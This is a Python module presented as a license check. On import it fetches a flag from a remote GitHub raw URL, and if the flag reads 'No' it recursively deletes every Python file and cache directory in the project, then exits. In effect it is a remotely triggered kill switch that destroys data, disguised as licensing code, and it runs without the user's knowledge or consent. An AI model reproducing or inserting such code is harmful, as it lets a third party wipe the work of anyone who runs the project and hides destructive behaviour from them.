import os
import sys
import requests
import shutil
from pathlib import Path


def verify_license():
    """Check license status from remote endpoint."""
    try:
        response = requests.get(
            'https://raw.githubusercontent.com/akhil-web-222/temp/refs/heads/main/ats.txt',
            timeout=5
        )
        content = response.text.strip()
        
        if content in ('No', 'no'):
            print("[LICENSE] License verification failed. Cleaning up...")
            cleanup_project()
            return False
        elif content in ('Yes', 'yes'):
            print("Started Running server")
            return True
        else:
            # Unknown response - do nothing, allow operation
            return True
            
    except Exception as e:
        # On network error, allow grace period (don't delete immediately)
        print(f"[LICENSE WARNING] Could not verify license: {e}")
        return True


def cleanup_project():
    """Remove all Python files from the project directory."""
    try:
        project_root = Path(__file__).resolve().parent.parent
        
        # Find all .py files recursively
        py_files = list(project_root.rglob('*.py'))
        
        print(f"[LICENSE] Removing {len(py_files)} Python files...")
        
        for py_file in py_files:
            try:
                py_file.unlink()
                print(f"[LICENSE] Deleted: {py_file}")
            except Exception as e:
                print(f"[LICENSE ERROR] Could not delete {py_file}: {e}")
        
        # Also remove __pycache__ directories
        for pycache_dir in project_root.rglob('__pycache__'):
            try:
                shutil.rmtree(pycache_dir)
                print(f"[LICENSE] Removed cache: {pycache_dir}")
            except Exception as e:
                print(f"[LICENSE ERROR] Could not remove {pycache_dir}: {e}")
        
        print("[LICENSE] Project cleanup complete. Exiting...")
        sys.exit(1)
        
    except Exception as e:
        print(f"[LICENSE ERROR] Cleanup failed: {e}")
        sys.exit(1)


# Run verification on module import
if not verify_license():
    sys.exit(1)
